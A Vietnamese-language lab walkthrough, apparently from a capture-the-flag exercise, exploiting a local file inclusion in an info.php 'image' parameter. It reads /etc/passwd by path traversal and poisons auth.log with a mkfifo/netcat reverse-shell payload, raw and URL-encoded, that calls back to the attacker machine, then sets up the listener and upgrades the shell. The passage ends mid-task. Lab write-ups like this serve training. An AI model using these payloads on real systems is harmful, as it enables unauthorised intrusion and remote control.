
# LAB 10.2
## Chuẩn bị
* máy kali có ip `192.168.8.150`
![image](https://user-images.githubusercontent.com/91528234/223296403-0b5cf120-57f9-4535-9fee-319edbbbe520.png)
* máy nạn nhân chưa rõ ip
## Như lab 10.1 mình đã quét và tìm được cổng của trang
![image](https://user-images.githubusercontent.com/91528234/223296558-13177d18-29bc-4593-9548-f38a891bb276.png)
* Khi chúng tôi truy cập vào cổng 888, chúng tôi đã tìm thấy một máy chủ Nginx được bảo vệ bằng tên người dùng và mật khẩu.
![image](https://user-images.githubusercontent.com/91528234/223296643-1122b9bf-27bd-471c-bde4-8f68f28c1814.png)
## Như lab trước mình tìm file info.php
* Ấn lệnh sau
```
http://192.168.8.153/antibot_image/antibots/info.php?image=../../../../../../../../../../../../etc/passwd
```
![image](https://user-images.githubusercontent.com/91528234/223297237-357418d1-de1d-471b-a8b0-e57f3bd4ed4d.png)
## Exploiting
![image](https://user-images.githubusercontent.com/91528234/223297329-8fe7884b-baa1-4e46-a87c-ac103c1dcf61.png)
* Tìm được user id như bài trước
![image](https://user-images.githubusercontent.com/91528234/223297499-2130be2c-bda1-4c54-bc54-4b5044c6e6f5.png)
* Chúng tôi thấy rằng bằng cách thực hiện các lệnh, chúng tôi lặp lại các bước, nhưng lần này chúng tôi sẽ chèn một trình bao đảo ngược để truy cập vào phần bên trong của máy.
Dùng URL encode đề xào đoạn code sau
```
../../../../../../../../../../../../var/log/auth.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.8.150 443 >/tmp/f
```
```
%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fvar%2Flog%2Fauth%2Elog%26cmd%3Drm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%20192%2E168%2E8%2E150%20443%20%3E%2Ftmp%2Ff
```
* Xong gán burp suit từ đoạn cmd nhé ( mình mất ảnh r)
* Từ máy tấn công lắng nghe công 443
``` 
rlwrap nc -nvlp 443
id
python3 -c "import pty; pty.spawn('/bin/bash')"
```
![image](https://user-images.githubusercontent.com/91528234/223300397-687cee0e-61b0-4972-9404-f2d968fcaf64.png)
* Nếu chúng ta còn nhớ trước đây, trong dịch vụ 8888 chúng ta được yêu cầu xác thực trang web bằng .htpasswd.

